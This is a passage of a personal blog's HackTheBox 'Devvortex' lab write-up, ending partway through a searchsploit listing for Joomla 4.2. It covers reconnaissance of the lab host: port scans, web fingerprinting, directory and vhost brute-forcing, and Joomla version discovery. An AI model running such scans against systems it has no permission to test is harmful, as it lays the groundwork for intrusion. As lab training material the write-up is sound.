@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox Devvortex - bchoy.me</title><meta name="Description" content="bchoy.me"><meta property="og:title" content="HackTheBox Devvortex" />
+<meta property="og:description" content="Initial Enumeration Port Scanning We kick off enumeration with rustscan and look for any services running on the target.
+❯ rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.242 -- -sV -sC -oA ./{{ip}}.initial The initial scan shows the target listening on ports 22 and 80.
+Port Protocol State Service Reason Product Version Extra Info 22 tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 Ubuntu Linux; protocol 2.0 80 tcp open http syn-ack nginx 1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchoy.me/posts/2023-12-11-hackthebox-devvortex/" /><meta property="og:image" content="https://bchoy.me/posts/2023-12-11-hackthebox-devvortex/featured-image.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-11T15:43:42+00:00" />
+<meta property="article:modified_time" content="2023-12-11T15:43:42+00:00" /><meta property="og:site_name" content="bchoy.me" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://bchoy.me/posts/2023-12-11-hackthebox-devvortex/featured-image.png"/>
+<meta name="twitter:title" content="HackTheBox Devvortex"/>
+<meta name="twitter:description" content="Initial Enumeration Port Scanning We kick off enumeration with rustscan and look for any services running on the target.
+❯ rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.242 -- -sV -sC -oA ./{{ip}}.initial The initial scan shows the target listening on ports 22 and 80.
+Port Protocol State Service Reason Product Version Extra Info 22 tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 Ubuntu Linux; protocol 2.0 80 tcp open http syn-ack nginx 1."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bchoy.me/posts/2023-12-11-hackthebox-devvortex/" /><link rel="prev" href="https://bchoy.me/posts/2023-04-30-running-a-fully-automated-media-center/" /><link rel="next" href="https://bchoy.me/posts/2023-12-13-hackthebox-surveillance/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox Devvortex",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/bchoy.me\/posts\/2023-12-11-hackthebox-devvortex\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/bchoy.me\/posts\/2023-12-11-hackthebox-devvortex\/featured-image.png",
+                            "width":  1400 ,
+                            "height":  1166 
+                        }],"genre": "posts","wordcount":  3475 ,
+        "url": "https:\/\/bchoy.me\/posts\/2023-12-11-hackthebox-devvortex\/","datePublished": "2023-12-11T15:43:42+00:00","dateModified": "2023-12-11T15:43:42+00:00","license": "bchoy.me","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Brian Choy"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="bchoy.me">bchoy.me</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Blog </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/resume"> Resume </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="bchoy.me">bchoy.me</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Blog</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/resume" title="">Resume</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox Devvortex</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://bchoy.me" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Brian Choy</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="12-11-2023">12-11-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3475 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;17 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/featured-image.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/featured-image.png, /posts/2023-12-11-hackthebox-devvortex/featured-image.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/featured-image.png"
+        title="/posts/2023-12-11-hackthebox-devvortex/featured-image.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-enumeration">Initial Enumeration</a>
+      <ul>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#joomla-enumeration">Joomla Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#joomla-exploitation">Joomla Exploitation</a>
+      <ul>
+        <li><a href="#additional-information-and-alternative-routes">Additional Information and Alternative Routes</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-enumeration-and-privilege-escalation">Linux Enumeration and Privilege Escalation</a>
+      <ul>
+        <li><a href="#mysql-enumeration">MySQL Enumeration</a></li>
+        <li><a href="#password-cracking">Password Cracking</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>We kick off enumeration with <code>rustscan</code> and look for any services running on the
+target.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ rustscan -t <span class="m">1500</span> -b <span class="m">1500</span> --ulimit <span class="m">65000</span> -a 10.10.11.242 -- -sV -sC -oA ./<span class="o">{{</span>ip<span class="o">}}</span>.initial
+</span></span></code></pre></div><p>The initial scan shows the target listening on ports <code>22</code> and <code>80</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocol</th>
+<th>State</th>
+<th>Service</th>
+<th>Reason</th>
+<th>Product</th>
+<th>Version</th>
+<th>Extra Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>syn-ack</td>
+<td>OpenSSH</td>
+<td>8.2p1 Ubuntu 4ubuntu0.9</td>
+<td>Ubuntu Linux; protocol 2.0</td>
+</tr>
+<tr>
+<td>80</td>
+<td>tcp</td>
+<td>open</td>
+<td>http</td>
+<td>syn-ack</td>
+<td>nginx</td>
+<td>1.18.0</td>
+<td>Ubuntu</td>
+</tr>
+</tbody>
+</table>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Trying to access <a href="http://10.10.11.242" target="_blank" rel="noopener noreffer ">http://10.10.11.242</a> redirects to <a href="http://devvortex.htb/" target="_blank" rel="noopener noreffer ">http://devvortex.htb/</a> and
+fails to connect.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image.png, /posts/2023-12-11-hackthebox-devvortex/assets/image.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image.png"
+        title="Failed to Connect" width="1790" height="1159" /></p>
+<p>Adding the following to <code>/etc/hosts</code> will allow us to see the site.</p>
+<pre tabindex="0"><code>10.10.11.242 devvortex.htb
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-1.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-1.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-1.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-1.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-1.png"
+        title="Devvortex Home Page" width="1788" height="1158" /></p>
+<p>We use <code>whatweb</code> to see what the site is running.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ whatweb devvortex.htb
+</span></span><span class="line"><span class="cl">http://devvortex.htb <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Bootstrap, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, Email<span class="o">[</span>info@DevVortex.htb<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.11.242<span class="o">]</span>, JQuery<span class="o">[</span>3.4.1<span class="o">]</span>, Script<span class="o">[</span>text/javascript<span class="o">]</span>, Title<span class="o">[</span>DevVortex<span class="o">]</span>, X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge<span class="o">]</span>, nginx<span class="o">[</span>1.18.0<span class="o">]</span>
+</span></span></code></pre></div><p>None of these stands out as a good entrypoint to dig further into. Browsing the
+site using <code>burp</code> also yields no immediate interesting results.</p>
+<p>Directory enumeration using <code>feroxbuster</code> also yields no interesting results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ feroxbuster -u <span class="s2">&#34;http://devvortex.htb&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --silent
+</span></span><span class="line"><span class="cl">http://devvortex.htb/about.html                                                             http://devvortex.htb/do.html                                                                http://devvortex.htb/images/d-3.png                                                         http://devvortex.htb/css/responsive.css                                                     http://devvortex.htb/images/linkedin.png                                                    http://devvortex.htb/images/envelope-white.png                                              http://devvortex.htb/images/d-2.png                                                         http://devvortex.htb/images/quote.png                                                       http://devvortex.htb/images/location-white.png                                              http://devvortex.htb/images/twitter.png                                                     http://devvortex.htb/images/d-4.png                                                         http://devvortex.htb/images/youtube.png                                                     http://devvortex.htb/images/d-1.png                                                         http://devvortex.htb/images/fb.png                                                          http://devvortex.htb/portfolio.html                                                         http://devvortex.htb/images/c-1.png                                                         http://devvortex.htb/images/telephone-white.png                                             http://devvortex.htb/index.html                                                             http://devvortex.htb/contact.html                                                           http://devvortex.htb/css/style.css                                                          http://devvortex.htb/images/c-2.png                                                         http://devvortex.htb/images/c-3.png                                                         http://devvortex.htb/images/insta.png                                                       http://devvortex.htb/images/                                                                http://devvortex.htb/css/                                                                   http://devvortex.htb/js/                                                                    http://devvortex.htb/js/jquery-3.4.1.min.js                                                 http://devvortex.htb/images/map-img.png                                                     http://devvortex.htb/images/who-img.jpg                                                     http://devvortex.htb/                                                                       http://devvortex.htb/images/w-4.png                                                         http://devvortex.htb/js/bootstrap.js                                                        http://devvortex.htb/images/w-3.png                                                         http://devvortex.htb/images/w-2.png                                                         http://devvortex.htb/css/bootstrap.css                                                      http://devvortex.htb/images/w-1.png
+</span></span></code></pre></div><p>DNS and subdomain enumeration will not work since there are no nameservers to
+access in the lab. Instead we perform <code>vhost</code> enumeration against the target
+using <code>ffuf</code> and filter out responses with the size <code>154</code>. The filtered size was
+determined via an initial run.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ ffuf -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="s2">&#34;HOST: FUZZ.devvortex.htb&#34;</span> -fs <span class="m">154</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://devvortex.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.devvortex.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response size: <span class="m">154</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev                     <span class="o">[</span>Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 133ms<span class="o">]</span>
+</span></span></code></pre></div><p>There is a hit on <code>dev.devvortex.htb</code> and we add it to the <code>/etc/hosts</code> file to
+access the subdomain.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-2.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-2.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-2.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-2.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-2.png"
+        title="dev.devvortex.htb Home Page" width="1792" height="1160" /></p>
+<p>We perform the same enumeration as <a href="http://devvortex.htb" target="_blank" rel="noopener noreffer ">http://devvortex.htb</a> to see if there are
+any new or interesting results on the <code>dev</code> subdomain.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ whatweb dev.devvortex.htb
+</span></span><span class="line"><span class="cl">http://dev.devvortex.htb <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Bootstrap, Cookies<span class="o">[</span>1daf6e3366587cf9ab315f8ef3b5ed78<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, Email<span class="o">[</span>contact@devvortex.htb,contact@example.com,info@Devvortex.htb,info@devvortex.htb<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly<span class="o">[</span>1daf6e3366587cf9ab315f8ef3b5ed78<span class="o">]</span>, IP<span class="o">[</span>10.10.11.242<span class="o">]</span>, Lightbox, Script, Title<span class="o">[</span>Devvortex<span class="o">]</span>, UncommonHeaders<span class="o">[</span>referrer-policy,cross-origin-opener-policy<span class="o">]</span>, X-Frame-Options<span class="o">[</span>SAMEORIGIN<span class="o">]</span>, nginx<span class="o">[</span>1.18.0<span class="o">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ feroxbuster -u <span class="s2">&#34;http://dev.devvortex.htb&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d <span class="m">1</span> --silent
+</span></span><span class="line"><span class="cl">http://dev.devvortex.htb/bin                                                                http://dev.devvortex.htb/installation                                                       http://dev.devvortex.htb/logs                                                               http://dev.devvortex.htb/cache <span class="o">=</span>&gt; http://dev.devvortex.htb/cache/                           http://dev.devvortex.htb/plugins <span class="o">=</span>&gt; http://dev.devvortex.htb/plugins/                       http://dev.devvortex.htb/images <span class="o">=</span>&gt; http://dev.devvortex.htb/images/                         http://dev.devvortex.htb/includes <span class="o">=</span>&gt; http://dev.devvortex.htb/includes/                     http://dev.devvortex.htb/administrator <span class="o">=</span>&gt; http://dev.devvortex.htb/administrator/           http://dev.devvortex.htb/templates <span class="o">=</span>&gt; http://dev.devvortex.htb/templates/                   http://dev.devvortex.htb/modules <span class="o">=</span>&gt; http://dev.devvortex.htb/modules/                       http://dev.devvortex.htb/language <span class="o">=</span>&gt; http://dev.devvortex.htb/language/                     http://dev.devvortex.htb/media <span class="o">=</span>&gt; http://dev.devvortex.htb/media/                           http://dev.devvortex.htb/tmp <span class="o">=</span>&gt; http://dev.devvortex.htb/tmp/                               http://dev.devvortex.htb/components <span class="o">=</span>&gt; http://dev.devvortex.htb/components/                 http://dev.devvortex.htb/libraries <span class="o">=</span>&gt; http://dev.devvortex.htb/libraries/
+</span></span></code></pre></div><p><a href="http://dev.devvortex.htb/administrator/" target="_blank" rel="noopener noreffer ">http://dev.devvortex.htb/administrator/</a> stands out and visiting it shows a
+login page.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-3.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-3.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-3.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-3.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-3.png"
+        title="Administrator Login Page" width="1792" height="1164" /></p>
+<p>The login page reveals that the site is using the <code>Joomla</code> CMS. We enumerate
+the files to see if there is anything exploitable or gives us key information
+such as the version number.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ feroxbuster -u <span class="s2">&#34;http://dev.devvortex.htb&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -d <span class="m">1</span> -C <span class="m">404</span> --dont-scan media
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl"><span class="p">|</span>__  <span class="p">|</span>__  <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ <span class="p">|</span> <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>__
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    <span class="p">|</span>___ <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>  <span class="se">\ </span><span class="p">|</span> <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>__/ <span class="p">|</span>___
+</span></span><span class="line"><span class="cl">by Ben <span class="s2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.1
+</span></span><span class="line"><span class="cl">───────────────────────────┬──────────────────────
+</span></span><span class="line"><span class="cl"> 🎯  Target Url            │ http://dev.devvortex.htb
+</span></span><span class="line"><span class="cl"> 🚫  Don<span class="err">&#39;</span>t Scan Regex      │ media
+</span></span><span class="line"><span class="cl"> 🚀  Threads               │ <span class="m">50</span>
+</span></span><span class="line"><span class="cl"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+</span></span><span class="line"><span class="cl"> 💢  Status Code Filters   │ <span class="o">[</span>404<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ <span class="m">7</span>
+</span></span><span class="line"><span class="cl"> 🦡  User-Agent            │ feroxbuster/2.10.1
+</span></span><span class="line"><span class="cl"> 🔎  Extract Links         │ <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"> 🏁  HTTP methods          │ <span class="o">[</span>GET<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 🔃  Recursion Depth       │ <span class="m">1</span>
+</span></span><span class="line"><span class="cl">───────────────────────────┴──────────────────────
+</span></span><span class="line"><span class="cl"> 🏁  Press <span class="o">[</span>ENTER<span class="o">]</span> to use the Scan Management Menu™
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl"><span class="m">404</span>      GET       69l      208w     3653c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with --dont-filter
+</span></span><span class="line"><span class="cl"><span class="m">403</span>      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with --dont-filter
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      339l     2968w    18092c http://dev.devvortex.htb/LICENSE.txt
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      501l     1581w    23221c http://dev.devvortex.htb/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      501l     1581w    23221c http://dev.devvortex.htb/index.php
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET       29l      105w      764c http://dev.devvortex.htb/robots.txt
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        0l        0w        0c http://dev.devvortex.htb/configuration.php
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET       74l      540w     4942c http://dev.devvortex.htb/README.txt
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      172l     1008w     6858c http://dev.devvortex.htb/htaccess.txt
+</span></span></code></pre></div><h3 id="joomla-enumeration">Joomla Enumeration</h3>
+<p><a href="http://dev.devvortex.htb/README.txt" target="_blank" rel="noopener noreffer ">http://dev.devvortex.htb/README.txt</a> reveals that the site is running version
+<code>4.x</code> of Joomla. Most likely <code>4.2.x</code>.</p>
+<pre tabindex="0"><code>Joomla! CMS™
+
+1- Overview
+ * This is a Joomla! 4.x installation/upgrade package.
+ * Joomla! Official site: https://www.joomla.org
+ * Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
+ * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
+</code></pre><p><a href="http://dev.devvortex.htb/robots.txt" target="_blank" rel="noopener noreffer ">http://dev.devvortex.htb/robots.txt</a> shows us more directories</p>
+<pre tabindex="0"><code># If the Joomla site is installed within a folder
+# eg www.example.com/joomla/ then the robots.txt file
+# MUST be moved to the site root
+# eg www.example.com/robots.txt
+# AND the joomla folder name MUST be prefixed to all of the
+# paths.
+# eg the Disallow rule for the /administrator/ folder MUST
+# be changed to read
+# Disallow: /joomla/administrator/
+#
+# For more information about the robots.txt standard, see:
+# https://www.robotstxt.org/orig.html
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /api/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+</code></pre><p>We look for available POCs for Joomla 4.2.x.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ searchsploit joomla 4.2
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                            <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Joomla! Component com_civicrm 4.2.2 - Remote Code Injecti <span class="p">|</span> php/webapps/24969.txt
+</span></span><span class="line"><span class="cl">Joomla! Component Google Map Landkarten 4.2.3 - SQL Injec <span class="p">|</span> php/webapps/44113.txt
+</span></span><span class="line"><span class="cl">Joomla! Component ionFiles 4.4.2 - File Disclosure        <span class="p">|</span> php/webapps/6809.txt
+</span></span><span class="line"><span class="cl">Joomla! Component jDownloads 1.0 - Arbitrary File Upload  <span class="p">|</span> php/webapps/17303.txt
+</span></span><span class="line"><span class="cl">Joomla! Component MaQma Helpdesk 4.2.7 - <span class="s1">&#39;id&#39;</span> SQL Injecti <span class="p">|</span> php/webapps/41399.txt
+</span></span><span class="line"><span class="cl">Joomla! Component mydyngallery 1.4.2 - SQL Injection      <span class="p">|</span> php/webapps/7343.txt
+</span></span><span class="line"><span class="cl">Joomla! com_hdwplayer 4.2 - <span class="s1">&#39;search.php&#39;</span> SQL Injection    <span class="p">|</span> php/webapps/48242.txt
+</span></span><span class="line"><span class="cl">Joomla! v4.2.8 - Unauthenticated information disclosure   <span class="p">|</span> php/webapps/51334.py
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
